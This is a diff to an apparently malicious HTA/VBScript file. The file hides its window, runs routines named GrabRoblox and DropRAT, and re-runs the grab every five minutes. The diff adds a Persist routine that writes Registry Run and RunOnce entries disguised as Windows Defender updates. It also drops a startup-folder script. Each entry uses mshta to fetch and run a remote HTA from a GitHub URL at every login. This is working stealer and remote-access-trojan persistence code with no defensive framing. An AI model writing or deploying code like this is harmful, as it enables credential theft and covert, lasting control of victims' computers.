@@ -14,6 +14,7 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
+    Call Persist
     Call GrabRoblox
     Call DropRAT
     window.setInterval "RegrabAll()", 300000
@@ -21,6 +22,23 @@ End Sub
 
 Sub RegrabAll()
     Call GrabRoblox
+End Sub
+
+Sub Persist()
+    Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
+
+    ' Registry Run — fires on every login
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
+
+    ' Registry RunOnce — fires next login as backup
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+
+    ' Startup folder VBS — fires on every login
+    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
+    Dim sf: Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
+    sf.Close
+    Set sf = Nothing
 End Sub
 
 Sub GrabRoblox()
